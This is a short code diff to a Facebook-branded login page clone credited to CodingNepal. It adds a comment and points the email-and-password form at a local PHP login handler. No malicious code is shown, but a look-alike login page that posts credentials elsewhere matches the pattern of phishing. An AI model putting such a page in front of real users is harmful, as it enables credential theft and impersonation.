@@ -7,6 +7,7 @@
     <title>Facebook Login Page | CodingNepal</title>
     <link rel="stylesheet" href="lib/style/login-style.css">
 </head>
+<!-- Shesh -->
 
 <body>
     <div class="container flex">
@@ -16,7 +17,7 @@
                 <p>Connect with friends and the world </p>
                 <p> around you on Facebook.</p>
             </div>
-            <form action="#">
+            <form action="./Code/login/login.php" method="post">
                 <input type="email" placeholder="Email or phone number" required>
                 <input type="password" placeholder="Password" required>
                 <div class="link">
